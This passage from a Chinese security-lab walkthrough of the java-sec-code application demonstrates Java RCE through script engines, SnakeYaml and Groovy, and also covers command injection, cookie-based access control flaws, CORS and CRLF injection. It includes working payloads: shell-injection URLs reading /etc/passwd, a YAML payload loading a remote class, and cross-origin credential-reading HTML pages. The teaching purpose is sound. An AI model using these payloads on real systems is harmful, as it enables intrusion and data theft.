http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> * var a &#x3D; mainOutput(); function mainOutput() &#123; var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="line"> *</span><br><span class="line"> * @param jsurl js url</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;jscmd&quot;)</span><br><span class="line">public void jsEngine(String jsurl) throws Exception&#123;</span><br><span class="line">    &#x2F;&#x2F; js nashorn javascript ecmascript</span><br><span class="line">    ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">    Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    String cmd &#x3D; String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用Python本地起一个服务器，写入JS进行触发</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png" alt="image-20210827152848993"></p><h3 id="6）Yaml反序列化命令执行"><a href="#6）Yaml反序列化命令执行" class="headerlink" title="6）Yaml反序列化命令执行"></a>6）Yaml反序列化命令执行</h3><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)</span><br><span class="line">public void yarm(String agrs) &#123;</span><br><span class="line">    String content &#x3D; &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">            &quot; !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">            &quot; !!java.net.URL [\&quot;http:&#x2F;&#x2F;o5s7wr.dnslog.cn\&quot;]\n&quot; +</span><br><span class="line">            &quot; ]]\n&quot; +</span><br><span class="line">            &quot;]&quot;;</span><br><span class="line">    Yaml y &#x3D; new Yaml();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行测试</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png" alt="image-20210827175118150"></p><p>使用师傅写好的利用脚本进行利用利用 <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>打开并修改代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package artsploit;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class="line"></span><br><span class="line">    public AwesomeScriptEngineFactory() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getNames() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getParameter(String key) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getProgram(String... statements) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ScriptEngine getScriptEngine() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p><p><a href="https://www.pdai.tech/md/java/advanced/java-advanced-spi.html">JavaSPI机制详解</a></p><p>使用Python搭建简单的WEB服务后进行利用</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png" alt="image-20210827180832145"></p><h3 id="7）Groovy-命令执行"><a href="#7）Groovy-命令执行" class="headerlink" title="7）Groovy 命令执行"></a>7）Groovy 命令执行</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p><p>可以使用GroovyShell类来执行任何Groovy脚本</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;groovy?content&#x3D;&quot;open -a Calculator&quot;.execute()</span><br><span class="line"> * @param content groovy shell</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;groovy&quot;)</span><br><span class="line">public void groovyshell(String content) &#123;</span><br><span class="line">    GroovyShell groovyShell &#x3D; new GroovyShell();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行利用如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png" alt="image-20210827183410408"></p><h2 id="2-CommandInject"><a href="#2-CommandInject" class="headerlink" title="2. CommandInject"></a>2. CommandInject</h2><p>命令行直接对请求参数进行拼接，可利用特殊字符分割执行其他命令</p><h3 id="1-参数注入"><a href="#1-参数注入" class="headerlink" title="1.参数注入"></a>1.参数注入</h3><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject?filepath&#x3D;&#x2F;tmp;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> *</span><br><span class="line"> * @param filepath filepath</span><br><span class="line"> * @return result</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&quot;)</span><br><span class="line">public String codeInject(String filepath) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd">http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png" alt="image-20210831100839084"></p><h3 id="2-Host注入"><a href="#2-Host注入" class="headerlink" title="2.Host注入"></a>2.Host注入</h3><p>在HTTP请求的host中命令执行</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Host Injection</span><br><span class="line"> * Host: hacked by joychou;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject&#x2F;host</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;host&quot;)</span><br><span class="line">public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; request.getHeader(&quot;host&quot;);</span><br><span class="line">    logger.info(host);</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dnslog进行测试</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png" alt="image-20210831103040958"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png" alt="image-20210831103104271"></p><p>进行命令注入时失败：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png" alt="image-20210831111452797"></p><p>查找半天原因之后发现</p><blockquote><p>是tomcat的版本问题,tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误,<br> 这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])。</p></blockquote><p>建议大家下一个低版本进行测试～</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png" alt="image-20210831120816642"></p><h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath &#x3D; SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null &#x3D;&#x3D; filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进FILTER_PATTERN函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\.-]+$&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png" alt="image-20210831142136765"></p><h2 id="3-Broken-Access-Control"><a href="#3-Broken-Access-Control" class="headerlink" title="3. Broken Access Control"></a>3. Broken Access Control</h2><p>某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick，导致越权问题。具体写法可能有<a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Cookies.java">Cookies代码</a>里的几种情况。</p><p>代码有如下几种情况：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="line"> *&#x2F;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;cookie&quot;)</span><br><span class="line">public class Cookies &#123;</span><br><span class="line"></span><br><span class="line">    private static String NICK &#x3D; &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln01&quot;)</span><br><span class="line">    public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; WebUtils.getCookieValueByName(req, NICK); &#x2F;&#x2F; key code</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln02&quot;)</span><br><span class="line">    public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie[] cookie &#x3D; req.getCookies();</span><br><span class="line"></span><br><span class="line">        if (cookie !&#x3D; null) &#123;</span><br><span class="line">            nick &#x3D; getCookie(req, NICK).getValue();  &#x2F;&#x2F; key code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                &#x2F;&#x2F; key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  &#x2F;&#x2F; key code</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln05&quot;)</span><br><span class="line">    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value &#x3D; &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开<a href="http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现">http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png" alt="image-20210901161038686"></p><h2 id="4-Cors"><a href="#4-Cors" class="headerlink" title="4. Cors"></a>4. Cors</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p><p>前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法：</p><ul><li>XMLHttpRequest</li><li>JQuery的<code>$.ajax</code></li><li>Fetch</li></ul><p>前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin)</code>，那么Response的header中不会出现<code>Access-Control-Allow-Origin</code>，因为Origin为空。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png" alt="image-20210901162616408"></p><p>在这样配置可以去访问任何服务资源</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>可以用curl来验证</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i  $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Origin: http:&#x2F;&#x2F;www.baidu.com&#39; \</span><br><span class="line">    -b $&#39;remember-me&#x3D;YWRtaW46MTYzMTY5MTA4NTA2OTpkZWYwZTFiYjc2MmZhYzFiMzdjMDc2MzNiYjcxOGJkOQ; JSESSIONID&#x3D;2F6ED87C606984C0547455D72FE2B9EE; XSRF-TOKEN&#x3D;1536dc0b-8b8b-4955-b669-c5b9f9b4bd6d&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;cors&#x2F;vuln&#x2F;origin&#39;</span><br></pre></td></tr></table></figure><p>Java-sec-code需要cookie来利用无cooike的poc如下</p><p>GET：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   var req &#x3D; new XMLHttpRequest(); </span><br><span class="line">   req.onload &#x3D; reqListener; </span><br><span class="line">   req.open(&#39;get&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">   &#x2F;&#x2F;req.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded;&quot;); </span><br><span class="line">   req.withCredentials &#x3D; true;</span><br><span class="line">   req.send();</span><br><span class="line">   function reqListener() &#123;</span><br><span class="line">    var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">   &#125;;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            var req &#x3D; new XMLHttpRequest();</span><br><span class="line">            var data &#x3D; &quot;userId%3Dadmin&quot;;</span><br><span class="line">            req.onload &#x3D; reqListener;</span><br><span class="line">            req.open(&#39;post&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">            req.setRequestHeader(&quot;Content-Type&quot;,&quot;xxx&quot;);</span><br><span class="line">            req.withCredentials &#x3D; true;</span><br><span class="line">            req.send(data);</span><br><span class="line">            function reqListener() &#123;</span><br><span class="line">                var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">                output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;Data: userId%3Dadmin&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;origin&quot;)</span><br><span class="line">public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;origin&quot;);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); &#x2F;&#x2F; set origin from header</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  &#x2F;&#x2F; allow cookie</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;setHeader&quot;)</span><br><span class="line">public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置HTTP头，然后直接返回信息</p><p>修复方式如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 重写Cors的checkOrigin校验方法</span><br><span class="line">     * 支持自定义checkOrigin，让其额外支持一级域名</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;CustomCorsProcessor</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @CrossOrigin(origins &#x3D; &#123;&quot;joychou.org&quot;, &quot;http:&#x2F;&#x2F;test.joychou.me&quot;&#125;)</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;crossOrigin&quot;)</span><br><span class="line">    public String secCrossOrigin() &#123;</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * WebMvcConfigurer设置Cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;config&#x2F;CorsConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;webMvcConfigurer&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * spring security设置cors</span><br><span class="line">     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;WebSecurityConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;httpCors&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自定义filter设置cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;OriginFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;originFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * CorsFilter设置cors。</span><br><span class="line">     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;BaseCorsFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;sec&#x2F;corsFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;checkOrigin&quot;)</span><br><span class="line">    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String origin &#x3D; request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">        &#x2F;&#x2F; 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">        if (origin !&#x3D; null &amp;&amp; SecurityUtil.checkURL(origin) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return &quot;Origin is not safe.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#CORS%E4%B8%8ECSRF%E7%9A%84%E5%8C%BA%E5%88%AB">Cors和CSRF的区别</a></p><h2 id="5-CRLFInjection"><a href="#5-CRLFInjection" class="headerlink" title="5.CRLFInjection"></a>5.CRLFInjection</h2><p>​    CRLF是”回车+换行”(\r\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;xxx%0a%0dSet-Cookie: test123&#x3D;123  &#x2F;&#x2F; 恶意添加修改信息</span><br></pre></td></tr></table></figure><p>​    关于实战，这里有几个案例，可以学习一波。</p><ol><li><a href="https://www.v0n.top/2020/01/29/CRLF注入/">CRLF注入</a></li><li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></li><li><a href="https://www.cnblogs.com/tr1ple/p/6648767.html">案例</a></li></ol><p>但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。</p><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;crlf&quot;)</span><br><span class="line">public class CRLFInjection &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;safecode&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        